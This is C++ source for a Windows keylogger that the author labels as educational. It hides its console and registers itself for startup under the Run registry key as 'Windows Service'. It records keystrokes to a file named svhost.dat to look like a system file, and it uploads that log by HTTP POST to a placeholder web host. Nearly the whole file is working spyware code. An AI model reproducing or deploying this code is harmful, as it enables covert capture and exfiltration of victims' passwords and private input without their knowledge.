//WORK:  TCP
//FEATURE IN : KeyLog (A-Z) save in a file (WORK all keys), ;
//RFEATURE IN: TCP, Startup, downloadFileEndDir/PHPServer ;
// Creato Da Diego Portoghese al solo scopo didattico

//LIB DECLARATION
/*
#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif
*/

#include <ctime>
#include <string>
#include <sstream>
#include <winsock2.h>//socket
#include <ws2tcpip.h>//socket
//#include <iostream> // In/out lib
#include <fstream> // file Stream lib
#include <windows.h> // windows bests ever LOL lib
    #include <direct.h>
    #define GetCurrentDir _getcwd
    #include <Lmcons.h>
// LIB PER LE SOCKET (chiedi a microfrost)
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

using namespace std;
//COSTANT
#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
//DECLARATION
int maxkey= 222; //KEY MAX (EASY MAN)
int KEY_BASE=0; //ADD TO sniff correct key
int arrgg[10];
int cj=0;



char* filename;

std::fstream outfile ;
std::ifstream infile ;
//FUNCION DEFINE
int addstrup();
void teme1();
void getkeyfunc(int __key);
void getkeyGay(int __key);
void sokStrFunc();
void Stealth();
int get_source(string url);

// VOID STEALTH ... FUNZIONE PER NASCONDE LA CONSOLE CONSOLE
void breakTime( int seconds)
{
    clock_t temp;
    temp = clock () + seconds * CLOCKS_PER_SEC ;
    while (clock() < temp) {}
}

int main()
{

/*
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
//    ShowWindow (GetConsoleWindow(), SW_HIDE);
*/





    TCHAR name [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;
    GetUserName( (TCHAR*)name, &size );
    stringstream str1;
    str1 << name;

    string strbuf1;
    str1 >> strbuf1;
    string filenstring= "C:\\Users\\" ;
    filenstring += strbuf1;
    filenstring += "\\svhost.dat"; //FILE WHERE SAVE THE DATAs

    filename = new char[filenstring.length() + 1];
    strcpy(filename, filenstring.c_str());



    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
    //cout << name ;

    char cCurrentPath[FILENAME_MAX];

    if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
     {
     return errno;
     }

    cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */

    //printf ("The current working directory is %s  ", cCurrentPath); //PRF


    //STARTUPFUNC
    int strfunc= addstrup();
    breakTime(1);
    ////cout << "___|  "<< strfunc <<"  |___";
    //-------------
    //Stealth(); // NASCONDE LA CONSOLE ALL AVVIO
    int s=1;
    char mname[ ]="KeyLoger";
    char vname[ ]="v 0.7b";
    //cout <<"\n-------\n"<< mname  <<"\n"<< vname << "\n-------\n:";
    //s=


    while (true){
switch (s)
{

case (1):
    //cout << "II\n\n(Selected: " << s <<" )"  ;
    teme1();

    break;
case (2):
    return 0;
    break;
default:
    break;
    //cout << " :";
//    cin >> s;

}

}



}

void Stealth(){
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

int addstrup()
{


        TCHAR szPath[MAX_PATH];
	    DWORD pathLen = 0;
	    // GetModuleFileName returnreturns the number of characters
	    // written to the array.
	    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	    if (pathLen == 0)
	    {
	    printf(TEXT("Unable to get module file name; last error = %lu\n"), GetLastError());
	    return -1;
	    }

	    HKEY newValue;

	    if (RegOpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&newValue) != ERROR_SUCCESS)
	    {
	    printf(TEXT("Unable to open registry key; last error = %lu\n"), GetLastError());
	    return -1;
	    }

	    // Need to pass the length of the path string in bytes,
	    // which may not equal the number of characters due to
	    // character set.

	    DWORD pathLenInBytes = pathLen * sizeof(*szPath);

	    if (RegSetValueEx(newValue,TEXT("Windows Service"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes) != ERROR_SUCCESS)
	    {
	    RegCloseKey(newValue);
	    printf(TEXT("Unable to set registry value; last error = %lu\n"), GetLastError());
	    return -1;
	    }

	    RegCloseKey(newValue);

}


int get_source(string url)
{
    string g= url;
    infile.open(filename);

    infile.seekg(0, std::ios::end);
    size_t size = infile.tellg();
    string sbuffer(size, ' ');
    infile.seekg(0);
    infile.read(&sbuffer[0], size);
    //SIZE
    int zisedisize = (int)size;
    zisedisize+=800;
    string stringtest1;
    ostringstream convert;   // stream used for the conversion
    convert << zisedisize;      // insert the textual representation of 'Number' in the characters in the stream
    stringtest1 = convert.str();


    //cout <<"__________" << stringtest1  << "___________";

    int rints;

    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,2), &WSAData);
    SOCKET sock;
    SOCKADDR_IN sin;


    //                    TCP
    //-----------------------------------------------------------
    char SiteName[ ]= "sitename.com"; //WEBSITE with page upload.php
    hostent * record = gethostbyname(SiteName);
    if (record == NULL)
    {
        switch (h_errno)
        {
            case HOST_NOT_FOUND:
                fputs ("The host was not found.\n", stderr);
                break;
            case NO_ADDRESS:
                fputs ("The name is valid but it has no address.\n", stderr);
                break;
            case NO_RECOVERY:
                fputs ("A non-recoverable name server error occurred.\n", stderr);
                break;
            case TRY_AGAIN:
                fputs ("The name server is temporarily unavailable.", stderr);
                break;
        }

    }

    in_addr * address = (in_addr * )record->h_addr;
    string ip_address = inet_ntoa(* address);

    const char *peppelomico = ip_address.c_str();

    char buffer[11024];
    string srequete = "";

    srequete += "POST /uppage2.php HTTP/1.1\r\n";
    srequete += "Host: ";
    srequete += SiteName;
    srequete += "\r\n";
    srequete += "Connection: Keep-Alive\r\n"; //Keep-Alive
    srequete += "Content-Type: multipart/form-data;boundary=---------------------------1198527128023\r\n";
    srequete += "Content-Length: ";
    srequete += stringtest1;
    srequete += "\r\n\r\n";
    srequete += "--";
    srequete += "---------------------------1198527128023\r\n";
    srequete += "Content-Disposition: form-data; name=\"userfile\"; filename=\"";
    srequete += filename;
    srequete += "\"\r\nContent-Type: text/plain\r\n\r\n";

    srequete += sbuffer; //FILE SEND

    srequete += "\r\n\r\n--";
    srequete += "---------------------------1198527128023--\r\n";

    size_t requete_taille = srequete.size() + 1;

    char crequete[requete_taille];
    strncpy( crequete, srequete.c_str(), requete_taille );

    int i = 0;
    string source = "";

    sock = socket(AF_INET, SOCK_STREAM, 0);


    sin.sin_addr.s_addr = inet_addr(peppelomico); //
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80); // port HTTP.

    connect(sock, (SOCKADDR *)&sin, sizeof(sin)); // on se connecte sur le site web.
    send(sock, crequete, strlen(crequete), 0); // on envoie la requête HTTP.
    ////cout <<"__________" << stringtest1  << "___________";



    /*
    do
    {
        i = recv(sock, buffer, sizeof(buffer), 0); // le buffer récupère les données reçues.
        source += buffer;
    } while (i != 0);*/



    closesocket(sock); // on ferme le socket.
    WSACleanup();


    ////cout << srequete;
    return 0;
}





void sokStrFunc()
{



}


void teme1()
{

    outfile.open  (filename, std::fstream::in | std::fstream::out | std::fstream::app); // Controlla se esiste FILENAME e parte a scrivere dalla fine del file
    if(!outfile.is_open()){
    ifstream outfile(filename);
    outfile.open(filename, fstream::in | fstream::out | fstream::app);
    }

    string ss= "ss";



    int n;
    n=get_source(ss);


    outfile.seekg(0, std::ios::end);
    size_t size = outfile.tellg();
    string sbuffer(size, ' ');
    outfile.seekg(0);
    outfile.read(&sbuffer[0], size);
    //cout << sbuffer ;


    int key [maxkey];
    int i=0;
    for (;i<maxkey;i++)
    {
        key[i] = i;

        key[i] += KEY_BASE;
        //cout << "key:" << i <<" " << key[i] <<endl;

    }
    while(true){

        int k=0;
        for (;k<maxkey;k++){
            if (GetAsyncKeyState(key[k]) < 0 ){

                if (k > 47 && k < 58 )
                {

	                //getkeyfunc(key[k]);/*
	                bool pressdown=false;
	                while (!pressdown)
	                {
	                    if (GetAsyncKeyState(key[k])==0)
	                    {
	                        pressdown= true;
	                    }
	                }
	                if (pressdown == true){
	                        int keynow = k;
	                        keynow += KEY_BASE;
	                            getkeyfunc(keynow);
	                            ////cout << "go";
	
	                        }
                }
                else if (k>64 && k < 91 || k==20) {

                                    //getkeyfunc(key[k]);/*
	                bool pressdown=false;
	                while (!pressdown){
	                	
	                    if (GetAsyncKeyState(key[k])==0){
	                        pressdown= true;
	                    }
	                }
	                if (pressdown == true){
	                        int keynow = k;
	                        keynow += KEY_BASE;
	                            getkeyfunc(keynow);
	                            ////cout << "go";
	
	                        }//*/
                }
                else {
                        ////cout << "- sz_A: "<< size_a << " ArggSz: " << arrgg[size_a] <<"-";
                            if(key[k] != arrgg[0] && key[k]!= arrgg[1] && key[k]!=arrgg[2] ){
                            	
                             getkeyfunc(key[k]);

                            }





                   }
            }

            }
        }



}


void getkeyfunc(int __key)
{
outfile.close();
outfile.open  (filename, std::fstream::in | std::fstream::out | std::fstream::app);

    if (cj > 2){
            cj=0;
    }

////cout <<"[ cj:" << cj << " ARRGGcj: "<< arrgg[cj] << " ]" ;




    if (__key > 64 && __key < 91)
    {
        ////cout << keynow <<" :log ";
        outfile << (char)__key ;
        //cout << (char) __key;
        arrgg[cj] = __key;
        cj++;
        }
        else if (__key >47 &&__key < 58)/* NOTE: ..vk_9 vk_A.. vk_Z match regular ASCII codes for digits and A-Z letters */
        {
        outfile << (char)__key ;
        //cout << (char) __key;
        arrgg[cj] = __key;
        cj++;
        }
        else {

    switch(__key)
    {
    case(8):
        //char t[ ]= "";
        outfile << "<BackSpace>";
        //cout << "<b>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(9):

        outfile << "<TAB>";
        //cout << "<t>";
        arrgg[cj] = __key;
        cj++;
        //getkeyGay(__key);
        break;
    case(20):
        outfile << "<CapsLock>";
        //cout << "<cl>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(46):
        outfile << "<Delete>";
        //cout << "<d>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(13):
        outfile << "<Return>";
        //cout << "<r>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(32):
        outfile << " ";
        //cout << " ";
        arrgg[cj] = __key;
        cj++;
        break;
    case(188):
        outfile << "( , )";
        //cout << "<,>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(190):
        outfile << "( . )";
        //cout << "<.>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(191):
        outfile << "( - )";
        //cout << "<->";
        arrgg[cj] = __key;
        cj++;
        break;
    case(160):
        outfile << "( sheft2 )";
        //cout << "<s2>";
        arrgg[cj] = __key;
        cj++;
        //getkeyGay(__key);
        break;
    case(16):
        outfile << "( sheft1 )";
        //cout << "<s1>";
        arrgg[cj] = __key;
        cj++;
        //getkeyGay(__key);
        break;
    case(164):
        outfile << "( LAlt )";
        //cout << "<lA>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(165):
        if(arrgg[cj-1] != 164)
        {
            arrgg[cj] = __key;
            cj++;
        outfile << "( RAlt )";
        //cout << "<rA>";
        }
        break;
    case(192):
        outfile << "( o'/@ )";
        //cout << "<o'/@>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(219):
        outfile << "( '/? )";
        //cout << "<'/?>" ;
        arrgg[cj] = __key;
        cj++;
        break;
    case(221):
        outfile << "( i'/^ )";
        //cout << "<i'/^>" ;
        arrgg[cj] = __key;
        cj++;
        break;
    case(186):
        outfile << "( e' )";
        //cout << "<e'>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(187):
        outfile << "( +/* )";
        //cout << "<+/*>";
        arrgg[cj] = __key;
        cj++;
        break;
    case(1):
        break;
    case(2):
        break;
    case(4):
        break;
    case(5):
        break;
    case(6):
        break;
    default:
        //outfile << "(K: "<< __key <<" )" ;
        ////cout << "(K:" << __key << " )";
        break;

    }
        }

}


//OLD
/*void getkeyGay(int __key)
    {


        while (true)
        {
        int key [maxkey];
        int k=0;

        for (;k<maxkey;k++){

                if(key[k] != __key)
            {

            if (GetAsyncKeyState(key[k]) < 0 )
            {
                        int keynow = k;
                        keynow += KEY_BASE;

                            outfile << "+";
                            getkeyfunc(keynow);
                }

            }
        }
        }

    }
*/
